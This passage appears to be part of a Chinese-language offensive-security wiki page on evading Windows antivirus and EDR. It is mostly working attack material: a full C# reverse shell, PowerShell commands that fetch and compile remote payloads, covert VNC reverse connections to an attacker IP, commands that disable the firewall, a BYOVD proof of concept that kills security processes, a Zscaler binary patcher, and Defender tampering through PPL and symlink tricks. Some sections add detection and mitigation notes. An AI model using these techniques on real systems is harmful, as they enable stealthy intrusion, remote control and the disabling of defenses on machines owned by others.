在 Windows10 之前，所有 Windows 都附带一个可以安装的 **Telnet server**（需要管理员权限），可以通过以下方式安装：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet port** (stealth) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (请选择 bin 下载，而不是 setup)

**在主机上**: Execute _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **新创建的** 文件 _**UltraVNC.ini**_ 放到 **受害者主机** 中

#### **反向连接**

攻击者应在其主机上执行二进制 `vncviewer.exe -listen 5900`，以便准备接收反向 **VNC 连接**。然后，在 **受害者主机** 上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为了保持隐蔽，必须避免以下操作

- 如果 `winvnc` 已经在运行则不要再次启动，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可用 `tasklist | findstr winvnc` 检查是否运行中
- 如果同目录没有 `UltraVNC.ini` 则不要启动 `winvnc`，否则会弹出[配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 来获取帮助，否则会触发一个[popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在 **启动监听器** 使用 `msfconsole -r file.rc` 并 **执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的 Defender 会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与之配合使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用了一个名为 **Antivirus Terminator** 的小型控制台工具，在部署勒索软件之前禁用终端防护。该工具携带其**自带的但*已签名*的漏洞驱动**并滥用它来发出有特权的内核操作，甚至 Protected-Process-Light (PPL) 的 AV 服务也无法阻止这些操作。

关键要点
1. **Signed driver**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。由于驱动带有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **Service installation**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **kernel service**，第二行启动它，从而使 `\\.\ServiceMouse` 在 user land 中可访问。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

最小 C 概念证明：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**：BYOVD 完全绕过了 user-mode 保护；在内核执行的代码可以打开 *protected* 进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他硬化特性的限制。

检测 / 缓解
• 启用 Microsoft 的 vulnerable-driver 阻止列表（`HVCI`, `Smart App Control`），以便 Windows 拒绝加载 `AToolsKrnl64.sys`。  
• 监控新的 *kernel* 服务创建，并在驱动从可被全局写入的目录加载或不在允许列表时发出告警。  
• 监视对自定义 device 对象的 user-mode handle 访问，随后伴随可疑的 `DeviceIoControl` 调用。

### 通过对磁盘上的二进制打补丁绕过 Zscaler Client Connector 的 Posture 检查

Zscaler 的 **Client Connector** 在本地应用 device-posture 规则，并依赖 Windows RPC 将结果传达给其他组件。两个薄弱的设计选择使得完全绕过成为可能：

1. Posture 评估**完全在客户端进行**（只向服务器发送一个布尔值）。  
2. 内部 RPC 端点只验证连接的可执行文件是否由 Zscaler **签名**（通过 `WinVerifyTrust`）。

通过**对磁盘上四个已签名的二进制打补丁**，这两种机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都被视为合规 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 任何（甚至未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 被短路化 |

最小 patcher 摘录：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
在替换原始文件并重启服务栈后：

* **所有** posture checks 显示 **绿色/合规**。
* 未签名或被修改的二进制可以打开 named-pipe RPC endpoints（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 受损主机获得对由 Zscaler 策略定义的内部网络的无限制访问。

该案例展示了纯客户端信任决策和简单签名检查如何通过少量字节补丁被击破。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) 强制执行 signer/level 层级，只有相等或更高权限的受保护进程才能互相篡改。进攻上，如果你能合法地启动一个启用了 PPL 的二进制并控制其参数，就可以将良性功能（例如 logging）转换为针对 AV/EDR 使用的受保护目录的受限、由 PPL 支持的 write primitive。

What makes a process run as PPL
- 目标 EXE（以及任何加载的 DLL）必须使用具备 PPL 功能的 EKU 签名。
- 进程必须使用 CreateProcess 创建，并使用标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制签名者匹配的兼容保护级别（例如，对 anti-malware 签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- 开源助手：CreateProcessAsPPL（选择保护级别并将参数转发到目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用模式：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 短路径 辅助
- 列出短名称：`dir /x` 在每个父目录中。
- 在 cmd 中派生短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用启动器（例如 CreateProcessAsPPL），以 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数以在受保护的 AV 目录（例如 Defender Platform）中强制创建文件。如有需要使用 8.3 短名。
3) 如果目标二进制文件在运行时通常被 AV 打开或锁定（例如 MsMpEng.exe），通过安装一个能可靠更早运行的自动启动服务，在 AV 启动之前将写入安排在引导时执行。使用 Process Monitor（引导日志）验证引导顺序。
4) 重启后，具有 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，破坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
# 注意事项和限制
- 你无法控制 ClipUp 写入的内容，除了放置位置；该原语更适合破坏而非精确的内容注入。
- 需要本地管理员/SYSTEM 权限来安装/启动服务并需要重启窗口。
- 时间至关重要：目标必须不可打开；启动时执行可以避免文件锁定。

## 检测
- 在引导期间，带有异常参数并由非标准启动器作为父进程创建 `ClipUp.exe` 的进程。
- 新的服务被配置为自动启动可疑二进制文件并始终在 Defender/AV 之前启动。在 Defender 启动失败之前调查服务的创建/修改。
- 对 Defender 二进制文件/Platform 目录进行文件完整性监控；注意带有 protected-process 标志的进程意外创建/修改文件。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程以及非-AV 二进制异常使用 PPL 级别的情况。

## 缓解措施
- WDAC/Code Integrity：限制哪些已签名的二进制可以以 PPL 运行以及在何种父进程下运行；阻止在非合法上下文中调用 ClipUp。
- 服务管理：限制自动启动服务的创建/修改并监控启动顺序的操纵。
- 确保启用 Defender 防篡改保护和早期启动保护；调查表明二进制损坏的启动错误。
- 如果与环境兼容（充分测试），考虑在托管安全工具的卷上禁用 8.3 短名称生成。

## 有关 PPL 和工具的参考
- Microsoft Protected Processes 概述: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU 参考: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon 引导日志（顺序验证）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- 技术说明（ClipUp + PPL + 启动顺序篡改）: https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender 通过枚举以下路径下的子文件夹来选择其运行的平台：
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

它选择具有最高按字典序排序的版本字符串的子文件夹（例如 `4.18.25070.5-0`），然后从那里启动 Defender 服务进程（并相应更新服务/注册表路径）。此选择信任目录条目，包括目录重解析点（符号链接）。管理员可以利用这一点将 Defender 重定向到攻击者可写的路径，从而实现 DLL 侧加载或服务中断。

### 前置条件
- 本地 Administrator（需要在 Platform 文件夹下创建目录/符号链接）
- 能够重启或触发 Defender 平台重新选择（引导时服务重启）
- 仅需内置工具（mklink）

### 为什么它有效
- Defender 会阻止对其自身文件夹的写入，但其平台选择信任目录条目并选择按字典序最高的版本，而不会验证目标是否解析到受保护/受信任的路径。

### 逐步（示例）
1) 准备当前 Platform 文件夹的可写克隆，例如 `C:\TMP\AV`：
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 选择触发器（建议重启）：
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该可以在 `C:\TMP\AV\` 下看到新的进程路径，并在服务配置/注册表中看到反映该位置的设置。

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs that Defender loads from its application directory to execute code in Defender’s processes. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 删除 version-symlink，这样在下一次启动时配置的路径将无法解析，Defender 无法启动:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：此技术本身不提供权限提升；它需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以通过钩取目标模块的 Import Address Table (IAT)，并将选定的 APIs 通过攻击者控制的、位置无关代码 (PIC) 路由，从而将运行时规避从 C2 implant 移出并置入目标模块本身。这将规避能力推广到超出许多工具包暴露的小型 API 面（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ 伪代码)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事项
- 在重定位/ASLR 之后且在首次使用导入之前应用补丁。reflective loaders like TitanLdr/AceLdr 演示了在加载模块的 DllMain 中进行 hooking。
- 保持 wrappers 精简且 PIC-safe；通过在打补丁前捕获的原始 IAT 值或 via LdrGetProcedureAddress 解析真实 API。
- 对 PIC 使用 RW → RX 转换，并避免留下可写+可执行的页。

调用栈伪装存根
- Draugr‑style PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后切入真实的 API。
- 这可以击败那些期望来自 Beacon/BOFs 到敏感 API 的规范调用栈的检测。
- 将其与 stack cutting/stack stitching 技术配合，以便在 API prologue 之前落入期望的栈帧内。

操作集成
- 在 post‑ex DLLs 前置 reflective loader，使得当 DLL 被加载时 PIC 和 hooks 自动初始化。
- 使用 Aggressor 脚本注册目标 APIs，使 Beacon 和 BOFs 在不改动代码的情况下透明地受益于相同的规避路径。

检测/DFIR 注意事项
- IAT 完整性：解析到非映像（heap/anon）地址的条目；对导入指针进行定期验证。
- 栈异常：返回地址不属于已加载映像；突变到非映像 PIC；RtlUserThreadStart 祖先关系不一致。
- 加载器遥测：进程内写入 IAT、在早期 DllMain 中修改导入 thunk 的活动、加载时创建的意外 RX 区域。
- 映像加载规避：如果 hooking LoadLibrary*，监控与 memory masking 事件相关联的可疑 automation/clr assemblies 加载。

相关构建模块和示例
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## 参考资料

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
